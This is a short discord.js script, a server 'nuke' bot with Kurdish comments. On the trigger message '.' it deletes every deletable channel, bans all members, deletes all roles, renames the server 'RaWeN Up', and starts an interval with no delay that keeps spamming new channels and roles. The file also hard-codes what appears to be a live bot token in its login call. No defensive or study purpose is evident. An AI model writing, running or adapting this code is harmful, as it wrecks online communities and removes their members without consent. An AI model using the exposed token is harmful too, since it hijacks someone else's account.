const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("balen Up", "text");///////bo channel 
        message.guild.createChannel("baleN Up", "voice");////bo voice
        message.guild.createRole({ name: "balenUp" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTM4OTQyODQwMzU1MDYxNzYw.YfxoqQ.iDVJJwk_StQCZf4f09Ib04PWBKk")
